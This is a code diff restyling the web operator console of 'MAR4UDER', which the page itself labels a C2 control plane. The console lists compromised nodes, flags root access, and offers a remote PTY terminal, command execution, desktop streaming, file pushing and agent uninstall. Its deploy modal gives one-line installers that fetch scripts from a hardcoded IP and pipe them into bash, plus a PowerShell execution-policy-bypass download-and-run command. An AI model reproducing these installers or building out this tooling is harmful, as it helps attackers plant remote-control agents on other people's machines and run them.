@@ -3,28 +3,31 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MAR4UDER // C2 CYBERNET CONSOLE</title>
+<title>MAR4UDER // CONSOLE</title>
 <script type="module" src="/video-stream.js"></script>
 <style>
   :root {
-    --bg-base: #06090e;
-    --bg-panel: #0b1017;
-    --bg-card: #101722;
-    --bg-card-active: #152234;
-    --border: #1a2636;
-    --border-glow: #00e5ff33;
-    --cyan: #00e5ff;
-    --green: #00ff88;
-    --magenta: #ff0055;
-    --amber: #ffb800;
-    --text-main: #d8e4f0;
-    --text-muted: #627894;
-    --font-mono: 'JetBrains Mono', 'Fira Code', Consolas, 'Courier New', monospace;
+    --bg-black: #000000;
+    --bg-dark: #080808;
+    --bg-surface: #0f0f0f;
+    --bg-surface-hover: #171717;
+    --bg-active: #200609;
+    --border-dim: #1e1e1e;
+    --border-mid: #333333;
+    --border-red: #ff0033;
+    --red-main: #ff0033;
+    --red-dim: #99001f;
+    --red-glow: rgba(255, 0, 51, 0.25);
+    --white: #ffffff;
+    --text-main: #d0d0d0;
+    --text-dim: #606060;
+    --text-dark: #383838;
+    --font-mono: 'JetBrains Mono', 'Fira Code', 'DejaVu Sans Mono', Consolas, 'Courier New', monospace;
   }
 
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
-    background: var(--bg-base);
+    background: var(--bg-black);
     color: var(--text-main);
     font-family: var(--font-mono);
     height: 100vh;
@@ -35,8 +38,8 @@
     letter-spacing: -0.2px;
   }
 
-  /* CANVAS BACKGROUND */
-  #bg-canvas {
+  /* ASCII WAVE CANVAS BACKGROUND */
+  #ascii-canvas {
     position: fixed;
     top: 0;
     left: 0;
@@ -44,363 +47,350 @@
     height: 100vh;
     pointer-events: none;
     z-index: 0;
-    opacity: 0.18;
+    opacity: 0.12;
   }
 
-  /* SCANLINES EFFECT */
-  .scanlines {
-    position: fixed;
-    inset: 0;
-    background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.35) 50%);
-    background-size: 100% 3px;
-    pointer-events: none;
-    z-index: 999;
-    opacity: 0.65;
-  }
-
-  /* TOP HEADER HUD */
+  /* HEADER CLI BAR */
   header {
-    background: rgba(11, 16, 23, 0.92);
-    border-bottom: 1px solid var(--border);
-    backdrop-filter: blur(8px);
-    padding: 6px 14px;
+    background: var(--bg-dark);
+    border-bottom: 1px solid var(--border-mid);
+    padding: 6px 12px;
     display: flex;
     align-items: center;
     justify-content: space-between;
-    min-height: 48px;
+    min-height: 44px;
     z-index: 100;
-    gap: 12px;
-  }
-
-  .brand-group {
-    display: flex;
-    align-items: center;
     gap: 10px;
   }
 
-  .brand-logo {
-    font-weight: 900;
-    font-size: 14px;
+  .header-left {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .ascii-logo {
+    font-size: 13px;
+    font-weight: 800;
     letter-spacing: 2px;
-    color: #fff;
-    text-shadow: 0 0 10px var(--cyan);
+    color: var(--white);
+    text-transform: uppercase;
+  }
+  .ascii-logo span {
+    color: var(--red-main);
+    text-shadow: 0 0 8px var(--red-glow);
+  }
+
+  .header-telemetry {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    font-size: 11px;
+    color: var(--text-dim);
+  }
+  .tel-box {
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+  }
+  .tel-val {
+    color: var(--white);
+    font-weight: 700;
+  }
+  .tel-red { color: var(--red-main); }
+  .tel-white { color: var(--white); }
+
+  .header-right {
     display: flex;
     align-items: center;
     gap: 6px;
   }
 
-  .brand-tag {
-    font-size: 9px;
-    padding: 2px 6px;
-    border: 1px solid var(--cyan);
-    color: var(--cyan);
-    border-radius: 2px;
-    background: rgba(0, 229, 255, 0.08);
-  }
-
-  .telemetry-bar {
-    display: flex;
-    align-items: center;
-    gap: 16px;
-    font-size: 11px;
-    color: var(--text-muted);
-  }
-
-  .t-item {
-    display: flex;
-    align-items: center;
-    gap: 5px;
-  }
-
-  .t-val {
-    color: #fff;
-    font-weight: 700;
-  }
-
-  .t-green { color: var(--green); }
-  .t-cyan { color: var(--cyan); }
-  .t-amber { color: var(--amber); }
-  .t-magenta { color: var(--magenta); }
-
-  .header-actions {
-    display: flex;
-    align-items: center;
-    gap: 8px;
-  }
-
-  /* BUTTONS */
-  .btn {
-    background: var(--bg-card);
-    border: 1px solid var(--border);
+  /* CLI BUTTONS */
+  .cli-btn {
+    background: var(--bg-black);
+    border: 1px solid var(--border-mid);
     color: var(--text-main);
-    padding: 5px 10px;
+    padding: 3px 8px;
     font-size: 11px;
     font-family: inherit;
-    font-weight: 600;
+    font-weight: 700;
     cursor: pointer;
-    border-radius: 2px;
-    transition: all 0.15s ease;
+    text-transform: uppercase;
+    transition: all 0.1s ease;
     display: inline-flex;
     align-items: center;
-    gap: 5px;
+    gap: 4px;
   }
-  .btn:hover {
-    border-color: var(--cyan);
-    color: #fff;
-    box-shadow: 0 0 8px rgba(0, 229, 255, 0.25);
+  .cli-btn:hover {
+    border-color: var(--red-main);
+    color: var(--white);
+    background: var(--bg-surface-hover);
   }
-  .btn-cyan {
-    border-color: var(--cyan);
-    color: var(--cyan);
-    background: rgba(0, 229, 255, 0.06);
+  .cli-btn.primary {
+    border-color: var(--red-main);
+    color: var(--red-main);
   }
-  .btn-cyan:hover {
-    background: var(--cyan);
-    color: #000;
-  }
-  .btn-magenta {
-    border-color: var(--magenta);
-    color: var(--magenta);
-  }
-  .btn-magenta:hover {
-    background: var(--magenta);
-    color: #fff;
+  .cli-btn.primary:hover {
+    background: var(--red-main);
+    color: var(--bg-black);
   }
 
-  /* LAYOUT */
-  #main-layout {
+  /* MAIN LAYOUT */
+  #main-container {
     flex: 1;
-    display: flex;
+    display: grid;
+    grid-template-columns: 340px 1fr;
     overflow: hidden;
     position: relative;
     z-index: 10;
   }
 
-  /* SIDEBAR: NODE ROSTER */
-  #sidebar {
-    width: 320px;
-    background: rgba(11, 16, 23, 0.85);
-    border-right: 1px solid var(--border);
-    backdrop-filter: blur(6px);
+  /* LEFT PANEL: NODE LIST */
+  #roster-panel {
+    background: var(--bg-dark);
+    border-right: 1px solid var(--border-mid);
     display: flex;
     flex-direction: column;
     overflow: hidden;
   }
 
-  .roster-header {
-    padding: 10px;
-    border-bottom: 1px solid var(--border);
-    display: flex;
-    flex-direction: column;
-    gap: 8px;
-  }
-
-  .search-box {
+  .panel-title-bar {
+    padding: 6px 10px;
+    background: var(--bg-surface);
+    border-bottom: 1px solid var(--border-dim);
     display: flex;
     align-items: center;
-    background: var(--bg-base);
-    border: 1px solid var(--border);
-    padding: 4px 8px;
-    border-radius: 2px;
+    justify-content: space-between;
+    font-size: 11px;
+    font-weight: 700;
+    color: var(--text-dim);
+    text-transform: uppercase;
   }
-  .search-box input {
-    background: transparent;
-    border: none;
-    color: #fff;
+  .panel-title-bar span {
+    color: var(--red-main);
+  }
+
+  .roster-controls {
+    padding: 8px 10px;
+    border-bottom: 1px solid var(--border-dim);
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+  }
+
+  .cli-input {
+    background: var(--bg-black);
+    border: 1px solid var(--border-mid);
+    color: var(--white);
+    padding: 4px 8px;
     font-family: inherit;
     font-size: 11px;
     width: 100%;
     outline: none;
   }
+  .cli-input:focus {
+    border-color: var(--red-main);
+  }
 
-  .roster-filters {
+  .filter-row {
     display: flex;
     gap: 4px;
   }
-  .filter-btn {
+  .filter-tab {
     flex: 1;
-    padding: 3px 6px;
-    font-size: 9px;
+    background: var(--bg-black);
+    border: 1px solid var(--border-dim);
+    color: var(--text-dim);
     font-family: inherit;
-    background: var(--bg-card);
-    border: 1px solid var(--border);
-    color: var(--text-muted);
+    font-size: 10px;
+    padding: 2px 4px;
     cursor: pointer;
     text-align: center;
   }
-  .filter-btn.active {
-    border-color: var(--cyan);
-    color: var(--cyan);
-    background: rgba(0, 229, 255, 0.08);
+  .filter-tab.active {
+    border-color: var(--red-main);
+    color: var(--white);
+    background: var(--bg-active);
   }
 
-  .node-list {
+  .node-table {
     flex: 1;
     overflow-y: auto;
-    padding: 6px;
+    padding: 4px;
     display: flex;
     flex-direction: column;
-    gap: 6px;
+    gap: 3px;
   }
 
-  /* NODE CARD */
-  .node-card {
-    background: var(--bg-card);
-    border: 1px solid var(--border);
-    padding: 8px 10px;
-    border-radius: 2px;
+  /* NODE ROW */
+  .node-row {
+    background: var(--bg-black);
+    border: 1px solid var(--border-dim);
+    padding: 6px 8px;
     cursor: pointer;
-    transition: all 0.12s ease;
     display: flex;
     flex-direction: column;
-    gap: 4px;
+    gap: 3px;
+    transition: all 0.08s ease;
   }
-  .node-card:hover {
-    border-color: rgba(0, 229, 255, 0.5);
-    background: rgba(21, 34, 52, 0.6);
+  .node-row:hover {
+    border-color: var(--border-mid);
+    background: var(--bg-surface);
   }
-  .node-card.active {
-    border-color: var(--cyan);
-    background: var(--bg-card-active);
-    box-shadow: inset 2px 0 0 var(--cyan);
+  .node-row.active {
+    border-color: var(--red-main);
+    background: var(--bg-active);
+    box-shadow: inset 2px 0 0 var(--red-main);
   }
 
-  .card-top {
+  .row-top {
     display: flex;
     align-items: center;
     justify-content: space-between;
+    font-size: 11px;
   }
-  .card-id-group {
-    display: flex;
-    align-items: center;
-    gap: 6px;
+  .row-id {
+    font-weight: 700;
+    color: var(--white);
   }
-  .card-slot {
+  .row-slot {
+    color: var(--red-main);
+    font-weight: 700;
+    margin-right: 4px;
+  }
+  .row-status {
     font-size: 10px;
-    color: var(--cyan);
     font-weight: 700;
   }
-  .card-name {
-    font-size: 12px;
-    font-weight: 700;
-    color: #fff;
-  }
-  .status-dot {
-    width: 7px;
-    height: 7px;
-    border-radius: 50%;
-    background: var(--text-muted);
-  }
-  .status-dot.online {
-    background: var(--green);
-    box-shadow: 0 0 6px var(--green);
-  }
-  .status-dot.stale {
-    background: var(--amber);
-  }
+  .status-on { color: var(--red-main); }
+  .status-off { color: var(--text-dim); }
 
-  .card-mid {
+  .row-bot {
     display: flex;
     align-items: center;
     justify-content: space-between;
     font-size: 10px;
-    color: var(--text-muted);
+    color: var(--text-dim);
   }
   .badge-root {
-    color: var(--magenta);
+    color: var(--red-main);
     font-weight: 700;
   }
-  .badge-user {
-    color: var(--green);
-  }
 
-  /* WORKSPACE */
-  #workspace {
-    flex: 1;
+  /* RIGHT WORKSPACE */
+  #workspace-panel {
+    background: var(--bg-black);
     display: flex;
     flex-direction: column;
     overflow: hidden;
-    background: rgba(6, 9, 14, 0.7);
   }
 
-  /* TOP WORKSPACE NAV TABS */
-  .tab-bar {
-    background: var(--bg-panel);
-    border-bottom: 1px solid var(--border);
+  .workspace-tabs {
+    background: var(--bg-dark);
+    border-bottom: 1px solid var(--border-mid);
     display: flex;
     align-items: center;
     justify-content: space-between;
-    padding: 0 10px;
+    padding: 0 8px;
   }
 
-  .tabs-group {
+  .tab-group {
     display: flex;
     align-items: center;
   }
 
-  .tab-btn {
-    padding: 10px 14px;
+  .w-tab {
+    padding: 8px 12px;
     font-size: 11px;
     font-family: inherit;
     font-weight: 700;
-    color: var(--text-muted);
+    color: var(--text-dim);
     background: transparent;
     border: none;
     border-bottom: 2px solid transparent;
     cursor: pointer;
-    display: flex;
-    align-items: center;
-    gap: 6px;
-    transition: all 0.12s ease;
+    text-transform: uppercase;
   }
-  .tab-btn:hover {
-    color: #fff;
+  .w-tab:hover {
+    color: var(--white);
   }
-  .tab-btn.active {
-    color: var(--cyan);
-    border-bottom-color: var(--cyan);
-    background: rgba(0, 229, 255, 0.04);
+  .w-tab.active {
+    color: var(--white);
+    border-bottom-color: var(--red-main);
+    background: var(--bg-surface);
   }
 
-  .tab-content {
+  .active-context-label {
+    font-size: 11px;
+    color: var(--red-main);
+    font-weight: 700;
+  }
+
+  .tab-pane {
     flex: 1;
     display: none;
     flex-direction: column;
     overflow: hidden;
     position: relative;
   }
-  .tab-content.active {
+  .tab-pane.active {
     display: flex;
   }
 
-  /* TAB: TERMINAL */
-  #term-container {
+  /* PTY TERMINAL PANE */
+  #terminal-screen {
     flex: 1;
-    background: #040608;
+    background: #000000;
     padding: 10px;
     overflow-y: auto;
     font-family: var(--font-mono);
     font-size: 12px;
-    line-height: 1.4;
+    line-height: 1.45;
+    color: #eaeaea;
     white-space: pre-wrap;
     word-break: break-all;
     outline: none;
   }
 
-  .term-toolbar {
-    background: var(--bg-panel);
-    border-top: 1px solid var(--border);
-    padding: 6px 10px;
+  .terminal-bar {
+    background: var(--bg-dark);
+    border-top: 1px solid var(--border-dim);
+    padding: 4px 8px;
     display: flex;
     align-items: center;
     gap: 6px;
     flex-wrap: wrap;
   }
 
-  /* TAB: DESKTOP STREAM */
-  #stream-viewport {
+  /* EXEC RPC PANE */
+  .rpc-container {
     flex: 1;
-    background: #000;
+    padding: 12px;
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+  }
+  .rpc-row {
+    display: flex;
+    gap: 6px;
+  }
+  .rpc-log {
+    flex: 1;
+    background: #000000;
+    border: 1px solid var(--border-dim);
+    padding: 10px;
+    font-family: inherit;
+    font-size: 11px;
+    color: var(--text-main);
+    overflow-y: auto;
+    white-space: pre-wrap;
+  }
+
+  /* VIDEO STREAM PANE */
+  #stream-box {
+    flex: 1;
+    background: #000000;
     display: flex;
     align-items: center;
     justify-content: center;
@@ -420,121 +410,99 @@
     object-fit: contain;
   }
 
-  /* TAB: RPC RUNNER */
-  .rpc-panel {
-    flex: 1;
-    display: flex;
-    flex-direction: column;
-    padding: 12px;
-    gap: 10px;
-  }
-  .rpc-input-group {
-    display: flex;
-    gap: 8px;
-  }
-  .rpc-input {
-    flex: 1;
-    background: var(--bg-card);
-    border: 1px solid var(--border);
-    color: #fff;
-    padding: 8px 12px;
-    font-family: inherit;
-    font-size: 12px;
-    border-radius: 2px;
-    outline: none;
-  }
-  .rpc-input:focus {
-    border-color: var(--cyan);
-  }
-  .rpc-output {
-    flex: 1;
-    background: #040608;
-    border: 1px solid var(--border);
-    padding: 12px;
-    color: var(--green);
-    font-family: inherit;
-    font-size: 11px;
-    overflow-y: auto;
-    white-space: pre-wrap;
-    border-radius: 2px;
-  }
-
-  /* TAB: FILES */
-  .file-manager {
+  /* FILES PANE */
+  .files-grid {
     flex: 1;
     display: grid;
     grid-template-columns: 1fr 1fr;
-    gap: 12px;
-    padding: 12px;
+    gap: 10px;
+    padding: 10px;
     overflow: hidden;
   }
-  .file-col {
-    background: var(--bg-panel);
-    border: 1px solid var(--border);
-    padding: 12px;
+  .files-section {
+    background: var(--bg-dark);
+    border: 1px solid var(--border-dim);
+    padding: 10px;
     display: flex;
     flex-direction: column;
-    gap: 10px;
-    border-radius: 2px;
+    gap: 8px;
     overflow: hidden;
   }
-  .file-list {
+  .file-rows {
     flex: 1;
     overflow-y: auto;
     display: flex;
     flex-direction: column;
-    gap: 4px;
+    gap: 3px;
   }
-  .file-item {
-    background: var(--bg-card);
-    border: 1px solid var(--border);
-    padding: 6px 10px;
+  .file-entry {
+    background: var(--bg-black);
+    border: 1px solid var(--border-dim);
+    padding: 4px 8px;
     display: flex;
     align-items: center;
     justify-content: space-between;
     font-size: 11px;
   }
 
-  /* MODALS */
-  .modal-overlay {
+  /* BOTTOM CLI FOOTER */
+  footer {
+    background: var(--bg-dark);
+    border-top: 1px solid var(--border-mid);
+    padding: 4px 10px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    font-size: 10px;
+    color: var(--text-dim);
+  }
+  .f-shortcuts {
+    display: flex;
+    gap: 10px;
+  }
+  .f-key {
+    color: var(--red-main);
+    font-weight: 700;
+  }
+
+  /* MODAL */
+  .cli-modal {
     position: fixed;
     inset: 0;
-    background: rgba(0, 0, 0, 0.8);
-    backdrop-filter: blur(4px);
+    background: rgba(0, 0, 0, 0.85);
     z-index: 1000;
     display: none;
     align-items: center;
     justify-content: center;
   }
-  .modal-overlay.open {
+  .cli-modal.open {
     display: flex;
   }
-  .modal-box {
-    background: var(--bg-panel);
-    border: 1px solid var(--cyan);
-    box-shadow: 0 0 20px rgba(0, 229, 255, 0.2);
-    width: 500px;
+  .modal-inner {
+    background: var(--bg-dark);
+    border: 1px solid var(--red-main);
+    box-shadow: 0 0 15px var(--red-glow);
+    width: 540px;
     max-width: 90vw;
-    padding: 16px;
-    border-radius: 2px;
+    padding: 14px;
     display: flex;
     flex-direction: column;
-    gap: 12px;
+    gap: 10px;
   }
-  .modal-head {
+  .modal-top {
     display: flex;
     align-items: center;
     justify-content: space-between;
-    border-bottom: 1px solid var(--border);
-    padding-bottom: 8px;
+    border-bottom: 1px solid var(--border-mid);
+    padding-bottom: 6px;
     font-weight: 700;
-    color: var(--cyan);
+    color: var(--white);
   }
-  .code-snippet {
-    background: #040608;
-    border: 1px solid var(--border);
-    padding: 8px 10px;
-    color: var(--green);
+  .code-block {
+    background: var(--bg-black);
+    border: 1px solid var(--border-mid);
+    padding: 6px 8px;
+    color: var(--red-main);
     font-size: 11px;
     user-select: all;
     word-break: break-all;
@@ -543,142 +511,150 @@
 </head>
 <body>
 
-<canvas id="bg-canvas"></canvas>
-<div class="scanlines" id="scanlines-el"></div>
+<canvas id="ascii-canvas"></canvas>
 
-<!-- HEADER HUD -->
+<!-- TOP CLI BAR -->
 <header>
-  <div class="brand-group">
-    <div class="brand-logo">⚡ MAR4UDER // C2</div>
-    <div class="brand-tag">DEDSEC CYBERNET</div>
+  <div class="header-left">
+    <div class="ascii-logo">MAR4UDER // <span>CONSOLE</span></div>
+    <div class="header-telemetry">
+      <div class="tel-box">NODES: <span class="tel-val tel-red" id="h-online-count">0</span>/<span class="tel-val" id="h-total-count">0</span></div>
+      <div class="tel-box">UPTIME: <span class="tel-val tel-white" id="h-uptime">0s</span></div>
+      <div class="tel-box">NET: <span class="tel-val tel-white" id="h-traffic">TX 0 KB / RX 0 KB</span></div>
+    </div>
   </div>
 
-  <div class="telemetry-bar">
-    <div class="t-item">NODES: <span class="t-val t-green" id="h-online-count">0</span>/<span class="t-val" id="h-total-count">0</span></div>
-    <div class="t-item">UPTIME: <span class="t-val t-cyan" id="h-uptime">0s</span></div>
-    <div class="t-item">TRAFFIC: <span class="t-val t-amber" id="h-traffic">TX 0 KB / RX 0 KB</span></div>
-  </div>
-
-  <div class="header-actions">
-    <button class="btn btn-cyan" onclick="openDeployModal()">+ QUICK DEPLOY</button>
-    <button class="btn" onclick="updateAllNodes()">🚀 UPDATE ALL</button>
-    <button class="btn" onclick="toggleScanlines()">CRT SCAN</button>
-    <button class="btn" onclick="toggleAudio()" id="audio-toggle-btn">🔊 AUDIO</button>
-    <button class="btn" onclick="refreshData()">⟳</button>
+  <div class="header-right">
+    <button class="cli-btn primary" onclick="openDeployModal()">[+] DEPLOY</button>
+    <button class="cli-btn" onclick="updateAllNodes()">[!] UPDATE ALL</button>
+    <button class="cli-btn" onclick="refreshData()">[R] REFRESH</button>
   </div>
 </header>
 
-<!-- MAIN WORKSPACE -->
-<div id="main-layout">
+<!-- MAIN CONTAINER -->
+<div id="main-container">
   
-  <!-- SIDEBAR ROSTER -->
-  <div id="sidebar">
-    <div class="roster-header">
-      <div class="search-box">
-        <input type="text" id="search-input" placeholder="🔍 Search host, ID, IP..." oninput="filterNodes()">
-      </div>
-      <div class="roster-filters">
-        <button class="filter-btn active" onclick="setFilter('all')">ALL</button>
-        <button class="filter-btn" onclick="setFilter('online')">ONLINE</button>
-        <button class="filter-btn" onclick="setFilter('root')">ROOT</button>
+  <!-- ROSTER PANEL -->
+  <div id="roster-panel">
+    <div class="panel-title-bar">
+      <div>NODE MATRIX // ROSTER</div>
+      <div id="roster-total">[0 NODES]</div>
+    </div>
+    <div class="roster-controls">
+      <input type="text" class="cli-input" id="search-box" placeholder="Filter ID, Hostname, IP..." oninput="filterNodes()">
+      <div class="filter-row">
+        <button class="filter-tab active" onclick="setFilter('all')">ALL</button>
+        <button class="filter-tab" onclick="setFilter('online')">ONLINE</button>
+        <button class="filter-tab" onclick="setFilter('root')">ROOT</button>
       </div>
     </div>
-    <div class="node-list" id="node-list-container">
-      <!-- Populated via JS -->
+    <div class="node-table" id="node-rows-container">
+      <!-- Generated via JS -->
     </div>
   </div>
 
-  <!-- WORKSPACE TABS -->
-  <div id="workspace">
-    <div class="tab-bar">
-      <div class="tabs-group">
-        <button class="tab-btn active" onclick="switchTab('tab-term')">💻 PTY TERMINAL</button>
-        <button class="tab-btn" onclick="switchTab('tab-rpc')">⚡ FAST EXEC</button>
-        <button class="tab-btn" onclick="switchTab('tab-stream')">🛰️ DESKTOP STREAM</button>
-        <button class="tab-btn" onclick="switchTab('tab-files')">📁 FILE MANAGER</button>
-        <button class="tab-btn" onclick="switchTab('tab-ops')">⚙️ NODE OPS</button>
+  <!-- WORKSPACE -->
+  <div id="workspace-panel">
+    <div class="workspace-tabs">
+      <div class="tab-group">
+        <button class="w-tab active" onclick="switchTab('pane-term')">[1] PTY TERMINAL</button>
+        <button class="w-tab" onclick="switchTab('pane-rpc')">[2] FAST EXEC</button>
+        <button class="w-tab" onclick="switchTab('pane-stream')">[3] VIDEO STREAM</button>
+        <button class="w-tab" onclick="switchTab('pane-files')">[4] FILE MANAGER</button>
+        <button class="w-tab" onclick="switchTab('pane-ops')">[5] SYSTEM OPS</button>
       </div>
-      <div id="active-target-info" style="font-size: 11px; color: var(--cyan); font-weight: 700;">NO TARGET SELECTED</div>
+      <div class="active-context-label" id="target-indicator">NO TARGET ATTACHED</div>
     </div>
 
-    <!-- TAB 1: PTY TERMINAL -->
-    <div class="tab-content active" id="tab-term">
-      <div id="term-container" tabindex="0">Connecting to terminal...</div>
-      <div class="term-toolbar">
-        <button class="btn" onclick="sendTerminalKey('id\n')">id</button>
-        <button class="btn" onclick="sendTerminalKey('uname -a\n')">uname</button>
-        <button class="btn" onclick="sendTerminalKey('ps aux | head -20\n')">ps</button>
-        <button class="btn" onclick="sendTerminalKey('ss -tulnp || netstat -tulnp\n')">ports</button>
-        <button class="btn" onclick="sendTerminalKey('df -h\n')">df</button>
-        <button class="btn" onclick="sendTerminalKey('\x03')">Ctrl+C</button>
-        <button class="btn" onclick="clearTerminal()">Clear</button>
+    <!-- PANE 1: TERMINAL -->
+    <div class="tab-pane active" id="pane-term">
+      <div id="terminal-screen" tabindex="0">Connecting to PTY terminal stream...</div>
+      <div class="terminal-bar">
+        <button class="cli-btn" onclick="sendTerminalKey('id\n')">id</button>
+        <button class="cli-btn" onclick="sendTerminalKey('uname -a\n')">uname -a</button>
+        <button class="cli-btn" onclick="sendTerminalKey('ps aux | head -20\n')">ps aux</button>
+        <button class="cli-btn" onclick="sendTerminalKey('ss -tulnp\n')">ss -tulnp</button>
+        <button class="cli-btn" onclick="sendTerminalKey('df -h\n')">df -h</button>
+        <button class="cli-btn" onclick="sendTerminalKey('\x03')">Ctrl+C</button>
+        <button class="cli-btn" onclick="clearTerminal()">Clear</button>
       </div>
     </div>
 
-    <!-- TAB 2: FAST RPC -->
-    <div class="tab-content" id="tab-rpc">
-      <div class="rpc-panel">
-        <div class="rpc-input-group">
-          <input type="text" class="rpc-input" id="rpc-cmd" placeholder="Enter remote command (e.g. cat /etc/os-release)..." onkeydown="if(event.key==='Enter') executeRPC()">
-          <button class="btn btn-cyan" onclick="executeRPC()">EXECUTE</button>
+    <!-- PANE 2: EXEC RPC -->
+    <div class="tab-pane" id="pane-rpc">
+      <div class="rpc-container">
+        <div class="rpc-row">
+          <input type="text" class="cli-input" id="rpc-input-cmd" placeholder="Enter shell command (e.g. cat /etc/os-release)..." onkeydown="if(event.key==='Enter') executeRPC()">
+          <button class="cli-btn primary" onclick="executeRPC()">EXEC</button>
         </div>
-        <div class="rpc-output" id="rpc-output">// Command output will appear here...</div>
+        <div class="rpc-log" id="rpc-log-viewer">// Direct RPC execution log output...</div>
       </div>
     </div>
 
-    <!-- TAB 3: DESKTOP STREAM -->
-    <div class="tab-content" id="tab-stream">
-      <div id="stream-viewport">
-        <div id="stream-placeholder" style="color: var(--text-muted); font-size: 12px;">Select an online node to view desktop stream</div>
+    <!-- PANE 3: STREAM -->
+    <div class="tab-pane" id="pane-stream">
+      <div id="stream-box">
+        <div id="stream-none" style="color: var(--text-dim); font-size: 11px;">[!] Select active node to initialize video stream</div>
       </div>
     </div>
 
-    <!-- TAB 4: FILES -->
-    <div class="tab-content" id="tab-files">
-      <div class="file-manager">
-        <div class="file-col">
-          <div style="font-weight: 700; color: var(--cyan);">PUSH FILE TO TARGET</div>
-          <input type="text" class="rpc-input" id="file-dest-path" placeholder="/tmp/payload.bin" value="/tmp/agent_data">
-          <input type="file" id="file-upload-input">
-          <button class="btn btn-cyan" onclick="pushFileToNode()">UPLOAD & PUSH TO NODE</button>
-          <div id="file-upload-status" style="font-size: 11px; color: var(--green);"></div>
+    <!-- PANE 4: FILES -->
+    <div class="tab-pane" id="pane-files">
+      <div class="files-grid">
+        <div class="files-section">
+          <div style="font-weight: 700; color: var(--white); font-size: 11px;">PUSH FILE TO TARGET</div>
+          <input type="text" class="cli-input" id="file-dest" placeholder="/tmp/payload.bin" value="/tmp/agent_bin">
+          <input type="file" id="file-local-input" style="font-size: 11px; color: var(--text-dim);">
+          <button class="cli-btn primary" onclick="pushFileToNode()">UPLOAD & TRANSFER</button>
+          <div id="file-transfer-status" style="font-size: 10px; color: var(--red-main);"></div>
         </div>
-        <div class="file-col">
-          <div style="font-weight: 700; color: var(--cyan);">SERVER REPOSITORY</div>
-          <div class="file-list" id="server-files-list">Loading files...</div>
+        <div class="files-section">
+          <div style="font-weight: 700; color: var(--white); font-size: 11px;">SERVER REPOSITORY</div>
+          <div class="file-rows" id="repo-files-container">Loading repository...</div>
         </div>
       </div>
     </div>
 
-    <!-- TAB 5: NODE OPS -->
-    <div class="tab-content" id="tab-ops">
-      <div class="rpc-panel">
-        <div style="font-weight: 700; color: var(--cyan);">LIFECYCLE & MAINTENANCE</div>
-        <div style="display: flex; gap: 8px; flex-wrap: wrap;">
-          <button class="btn btn-cyan" onclick="pingTarget()">📡 PING NODE</button>
-          <button class="btn" onclick="updateTarget()">🔄 UPDATE AGENT BINARY</button>
-          <button class="btn btn-magenta" onclick="uninstallTarget()">☠️ UNINSTALL AGENT</button>
+    <!-- PANE 5: SYSTEM OPS -->
+    <div class="tab-pane" id="pane-ops">
+      <div class="rpc-container">
+        <div style="font-weight: 700; color: var(--white); font-size: 11px;">NODE OPERATIONS</div>
+        <div style="display: flex; gap: 6px; flex-wrap: wrap;">
+          <button class="cli-btn" onclick="pingTarget()">[!] PING TARGET</button>
+          <button class="cli-btn" onclick="updateTarget()">[!] UPGRADE BINARY</button>
+          <button class="cli-btn" style="border-color: var(--red-dim);" onclick="uninstallTarget()">[X] UNINSTALL AGENT</button>
         </div>
-        <div class="rpc-output" id="ops-output">// Operation telemetry output...</div>
+        <div class="rpc-log" id="ops-log-viewer">// Operation telemetry output...</div>
       </div>
     </div>
 
   </div>
 </div>
 
+<!-- FOOTER -->
+<footer>
+  <div class="f-shortcuts">
+    <div><span class="f-key">1..5</span> Switch View</div>
+    <div><span class="f-key">Tab</span> Focus Terminal</div>
+    <div><span class="f-key">Ctrl+C</span> Interrupt</div>
+    <div><span class="f-key">Enter</span> Send Command</div>
+  </div>
+  <div>MAR4UDER RESILIENT RELAY // C2 CONTROL PLANE</div>
+</footer>
+
 <!-- DEPLOY MODAL -->
-<div class="modal-overlay" id="deploy-modal">
-  <div class="modal-box">
-    <div class="modal-head">
-      <div>QUICK ONE-LINE INSTALLERS</div>
-      <button class="btn" onclick="closeDeployModal()">✕</button>
+<div class="cli-modal" id="deploy-modal">
+  <div class="modal-inner">
+    <div class="modal-top">
+      <div>QUICK AGENT DEPLOYMENT</div>
+      <button class="cli-btn" onclick="closeDeployModal()">[X]</button>
     </div>
-    <div style="font-size: 11px; color: var(--text-muted);">Linux Target Agent (Curl):</div>
-    <div class="code-snippet" id="snip-agent">curl -s http://104.143.206.163:8080/i | bash</div>
-    <div style="font-size: 11px; color: var(--text-muted);">Operator Admin CLI (m4r):</div>
-    <div class="code-snippet" id="snip-m4r">curl -s http://104.143.206.163:8080/m4r | bash</div>
-    <div style="font-size: 11px; color: var(--text-muted);">Windows Powershell Agent:</div>
-    <div class="code-snippet" id="snip-win">powershell -ep bypass -c "iwr -useb http://104.143.206.163:8080/m4r.ps1 | iex"</div>
+    <div style="font-size: 10px; color: var(--text-dim);">Linux Agent (One-Line Curl):</div>
+    <div class="code-block" id="cmd-agent">curl -s http://104.143.206.163:8080/i | bash</div>
+    <div style="font-size: 10px; color: var(--text-dim);">Operator Console (m4r):</div>
+    <div class="code-block" id="cmd-m4r">curl -s http://104.143.206.163:8080/m4r | bash</div>
+    <div style="font-size: 10px; color: var(--text-dim);">Windows CLI / Agent:</div>
+    <div class="code-block" id="cmd-win">powershell -ep bypass -c "iwr -useb http://104.143.206.163:8080/m4r.ps1 | iex"</div>
   </div>
 </div>
 
@@ -687,40 +663,9 @@
   let selectedNode = null;
   let activeFilter = 'all';
   let termWS = null;
-  let audioEnabled = false;
-  let audioCtx = null;
 
-  // SOUND FX
-  function playBeep(freq = 600, dur = 0.04) {
-    if (!audioEnabled) return;
-    try {
-      if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-      const osc = audioCtx.createOscillator();
-      const gain = audioCtx.createGain();
-      osc.type = 'sine';
-      osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
-      gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
-      gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + dur);
-      osc.connect(gain);
-      gain.connect(audioCtx.destination);
-      osc.start();
-      osc.stop(audioCtx.currentTime + dur);
-    } catch(e){}
-  }
